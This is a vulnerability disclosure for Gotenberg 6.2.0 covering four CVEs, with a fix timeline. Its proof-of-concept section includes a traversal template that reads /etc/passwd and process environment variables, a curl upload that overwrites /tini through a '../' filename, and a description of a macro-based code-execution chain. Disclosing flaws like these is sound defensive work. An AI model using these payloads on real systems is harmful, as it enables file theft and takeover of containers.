@@ -1,0 +1,165 @@
+id: 35602
+date: 01/04/2021
+title: Gotenberg 6.2.0 Traversal / Code Execution / Insecure Permissions Vulnerabilities
+author: Blazej Adamczyk
+cves: CVE-2020-13449, CVE-2020-13450, CVE-2020-13451, CVE-2020-13452
+
+1 Multiple vulnerabilities in Gotenberg <= 6.2.0
+════════════════════════════════════════════════
+
+  Multiple vulnerabilities in Gotenberg (a Docker-powered stateless API
+  for converting HTML, Markdown and Office documents to PDF used as a
+  microservice) version <=6.2.0 allow a remote unauthenticated attacker
+  to execute any command within Docker container.
+
+  CVSSv3.1 chained score: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+
+  Disclosure summary: [https://sploit.tech/2020/12/29/Gotenberg.html]
+
+  Write-up: [https://blazej-adamczyk.medium.com/0-day-bug-breaks-multi-million-dollar-system-38c9e31b27e9]
+
+  Exploit code: [https://github.com/br0xpl/gotenberg_hack]
+
+  Video: [https://youtu.be/NAv8qovLtgI]
+
+
+1.1 Download tirectory traversal
+────────────────────────────────
+
+  CVE: CVE-2020-13449
+
+  Vendor: [https://www.thecodingmachine.com]
+
+  Product: Gotenberg ([https://github.com/thecodingmachine/gotenberg])
+
+  Version: <=6.2.1
+
+  Description: Directory traversal vulnerability in Markdown engine of
+  Gotenberg version 6.2.1 and lower allows unauthorized attacker to read
+  any container files.
+
+  PoC:
+  1. Create index.html file:
+     ┌────
+     │ <!doctype html>
+     │ <html lang="en">
+     │   <head>
+     │     <meta charset="utf-8">
+     │     <title>My PDF</title>
+     │   </head>
+     │   <body>
+     │     <pre style="white-space: pre-wrap;">
+     │       Path:
+     │       {{ .DirPath }}  
+     │       PASSWD:
+     │       {{ toHTML .DirPath "../../../../etc/passwd" }}
+     │       IP:
+     │       {{ toHTML .DirPath "../../../../proc/net/fib_trie" }}
+     │       TCP:
+     │       {{ toHTML .DirPath "../../../../proc/net/tcp" }}
+     │       env:
+     │       {{ toHTML .DirPath "../../../../proc/self/environ" }}
+     │     </pre>
+     │   </body>
+     │ </html>
+     └────
+  2. Call markdown endpoint:
+     ┌────
+     │ $ curl 'http://$URL_GOTENBERG/convert/markdown' --form files=@index.html\ 
+     │ -o result.pdf --header 'Content-Type: multipart/form-data'
+     └────
+
+
+1.2 Upload directory traversal
+──────────────────────────────
+
+  CVE: CVE-2020-13450
+
+  Vendor: [https://www.thecodingmachine.com]
+
+  Product: Gotenberg ([https://github.com/thecodingmachine/gotenberg])
+
+  Version: <=6.2.1
+
+  Description: Directory traversal vulnerability in file upload function
+  of Gotenberg version 6.2.1 and lower allows unauthorized attacker to
+  upload and overwrite any writeable files outside the desired folder.
+
+  This can lead to DoS, change program behaviour or even to code
+  execution (see CVE-2020-13451).
+
+  PoC:
+  ┌────
+  │ curl 'http://$URL_GOTENBERG/convert/markdown' --form files=@index.html \
+  │ --form "files=@tini;filename=../../../tini" -o res.pdf\ 
+  │ --header 'Content-Type: multipart/form-data'
+  └────
+
+
+1.3 Code exec vulnerability using incomplete cleanup vulnerability
+──────────────────────────────────────────────────────────────────
+
+  CVE: CVE-2020-13451
+
+  Vendor: [https://www.thecodingmachine.com]
+
+  Product: Gotenberg ([https://github.com/thecodingmachine/gotenberg])
+
+  Version: <=6.2.0
+
+  Description: Incomplete cleanup vulnerability in Office rendering
+  engine of Gotenberg version 6.2.1 and lower allows unauthorized
+  attacker (using a different vulnerability like CVE-2020-13450) to
+  overwrite libreoffice config (profile) files and execute arbitrary
+  code using macros.
+
+  Gotenberg creates libreoffice profile when office endpoint is called
+  in tmp choosing a folder with a name based on random ephemeral port
+  number chosen by kernel. What is most important after finishing
+  request the profile folder is not removed. Thus using a file upload
+  vulnerability like the one described in CVE-2020-13450 an attacker can
+  modify the profile preparing a macro which is going to be executed
+  next time the same random profile will be reused.
+
+  Analyzing kernel sources, in default kernel config, there will be
+  about 14115 different ports choosen at random. The hack requires to
+  retry many times but works reliably.
+
+  Exploit code: [https://github.com/br0xpl/gotenberg_hack]
+
+
+1.4 Insecure permissions of main executable
+───────────────────────────────────────────
+
+  CVE: CVE-2020-13452
+
+  Vendor: [https://www.thecodingmachine.com]
+
+  Product: Gotenberg ([https://github.com/thecodingmachine/gotenberg])
+
+  Version: <=6.2.1
+
+  Description: Insecure permissions of /tini (writeable by user
+  gotenberg) file potentially allows an attacker to overwrite the file
+  what can lead to Deny of Service or even code execution.
+
+
+2 Timeline
+══════════
+
+  • 25.05.2020 - Reported an issue:
+    [[https://github.com/thecodingmachine/gotenberg/issues/199]].
+  • 04.06.2020 - Author confirms the issues and works on a fix.
+  • 05.06.2020 - Pull request
+    [[https://github.com/thecodingmachine/gotenberg/pull/208]] created.
+  • 22.06.2020 - Fix merged to version 6.3.0.
+
+
+3 Credits
+═════════
+
+  Author: Blazej Adamczyk | [https://sploit.tech/]
+
+  Team: Efigo [https://efigo.pl/]
+
+#  0day.today [2023-03-25]  #
